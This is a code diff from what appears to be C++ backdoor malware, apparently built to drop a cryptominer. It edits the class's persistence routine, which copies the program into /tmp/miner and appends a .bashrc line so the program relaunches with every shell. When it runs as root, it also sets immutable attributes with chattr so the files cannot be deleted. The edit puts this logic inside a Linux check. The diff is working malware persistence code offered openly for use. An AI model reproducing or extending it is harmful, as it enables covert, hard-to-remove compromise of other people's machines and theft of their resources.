@@ -73,33 +73,37 @@ void Backdoor::menu(){
 
 void Backdoor::persistence(){
     
-    // variables
-    const char *  root_path_init_d = "/etc/init.d";
-    const char * persistence_directory = "/tmp/miner";
-    const char * chattr = "sudo chattr +ia /tmp/miner/";
-    std::string bash_rc_file = std::string(this->user_home) += std::string(".bashrc");
-    std::string move_to_dir = std::string("cp ") += std::string(this->program_name) += std::string(" ")
-                            += std::string(persistence_directory);
-    const char * copy = move_to_dir.c_str();
-    
-    std::string bash_rc_command_execution = std::string("cd /tmp/miner/; ./") += std::string(this->program_name);
-    std::string bash_rc_insertion = std::string("echo \"") += bash_rc_command_execution += std::string("\"") 
-                                    += std::string(" >> ") += bash_rc_file;
-    const char * persistence_on_bash_rc = bash_rc_insertion.c_str();
+    if(PLATFORM_NAME == "linux"){
+        // variables
+        const char *  root_path_init_d = "/etc/init.d";
+        const char * persistence_directory = "/tmp/miner";
+        const char * chattr = "sudo chattr +ia /tmp/miner/";
+        std::string bash_rc_file = std::string(this->user_home) += std::string(".bashrc");
+        std::string move_to_dir = std::string("cp ") += std::string(this->program_name) += std::string(" ")
+                                += std::string(persistence_directory);
+        const char * copy = move_to_dir.c_str();
+        
+        std::string bash_rc_command_execution = std::string("cd /tmp/miner/; ./") += std::string(this->program_name);
+        std::string bash_rc_insertion = std::string("echo \"") += bash_rc_command_execution += std::string("\"") 
+                                        += std::string(" >> ") += bash_rc_file;
+        const char * persistence_on_bash_rc = bash_rc_insertion.c_str();
 
 
-    // create directory to store stuff
-    mkdir(persistence_directory, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
-    this->execute_command(copy);
-    this->execute_command(persistence_on_bash_rc);
+        // create directory to store stuff
+        mkdir(persistence_directory, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+        this->execute_command(copy);
+        this->execute_command(persistence_on_bash_rc);
 
-    if(geteuid() != 0){
-        std::cout << "Not root";
+        if(geteuid() != 0){
+            std::cout << "Not root";
 
+        }else{
+            // only root can delete.
+            this->execute_command(chattr);
+            std::cout << "root";
+        }
     }else{
-        // only root can delete.
-        this->execute_command(chattr);
-        std::cout << "root";
+        std::cout << "Windows still not supported" << std::endl;
     }
 }
 
